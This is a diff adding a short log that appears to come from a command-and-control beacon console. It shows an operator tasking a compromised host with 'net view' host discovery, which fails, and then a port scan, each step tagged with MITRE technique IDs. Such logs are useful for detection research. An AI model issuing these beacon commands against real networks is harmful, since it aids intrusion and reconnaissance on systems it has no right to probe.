@@ -1,0 +1,21 @@
+12/05 08:08:24 UTC [input] <kali> net view
+12/05 08:08:24 UTC [task] <T1018, T1093> Tasked beacon to run net view
+12/05 08:08:24 UTC [checkin] host called home, sent: 105057 bytes
+12/05 08:08:27 UTC [output]
+received output:
+List of hosts:
+
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 2184
+
+
+12/05 08:08:37 UTC [checkin] host called home, sent: 1522 bytes
+12/05 08:08:44 UTC [input] <kali> portscan null-255.255.255.255 1-1024,3389,5000-6000 icmp 1024
+12/05 08:08:44 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on null-255.255.255.255
+12/05 08:08:44 UTC [checkin] host called home, sent: 93285 bytes
+12/05 08:08:48 UTC [output]
+received output:
+Scanner module is complete
+
+
